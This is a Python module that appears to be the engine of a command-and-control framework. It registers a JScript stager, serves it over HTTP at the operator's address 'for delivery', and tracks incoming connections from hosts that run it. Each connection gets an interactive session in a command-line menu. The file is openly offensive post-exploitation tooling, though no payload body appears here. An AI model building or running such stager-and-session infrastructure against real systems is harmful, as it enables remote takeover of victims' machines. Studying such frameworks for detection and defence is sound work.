import threading
import os
import random
import sys

from connect import color, connection, server, stagers, util


class Engine():

    connections = {}
    STAGERS = {}

    def __init__(self, ip, port, cli):
        self.cli = cli
        self.ip = ip
        self.port = port
        self.STAGERS ={
            util.generate_id():(stagers.JScriptStager(ip, port))
        }

    def create_connection(self, connection_id, stager_format):
        self.connections[connection_id] = connection.Connection(stager_format)
        self.cli.update_options({connection_id: util.MenuOption(self.connections[connection_id].interact, 'Interactive Connection', 'NOP-tions', color.normal, False)})
        return self.connections[connection_id]

    def display_connections(self):
        if not self.connections:
            color.information('No connections to display.')
            return 0
        color.header('Connections')
        for connection_id, connection in self.connections.items():
            if connection.status == 'connected':
                color.success(f'{connection_id}: {connection}', symbol=False)
                continue
            color.normal(f'{connection_id}: {connection}')
        color.normal('')
        return 0

    def display_stagers(self):
        color.header('Stagers')
        for stager_id, stager in self.STAGERS.items():
            color.normal(f'{stager.format}: http://{self.ip}:{self.port}/{stager_id}')
        color.normal('')
        return 0

    def retrieve_connection(self, connection_id):
        return self.connections[connection_id]

    def run(self):
        ''' Setting up the server. '''
        server.engine = self
        _connect_server = threading.Thread(target=server.run, args=((self.ip, self.port)))
        _connect_server.daemon = True
        _connect_server.start()

        ''' Setting up the command line. '''
        _menu_options = {}
        _menu_options['connections'] = util.MenuOption(self.display_connections, 'Displays current connections.', 'Engine Options', color.normal, False)
        _menu_options['stagers'] = util.MenuOption(self.display_stagers, 'Displays staged files ready for delivery.', 'Engine Options', color.normal, False)
        self.cli.update_options(_menu_options)
        self.cli.run()
        return
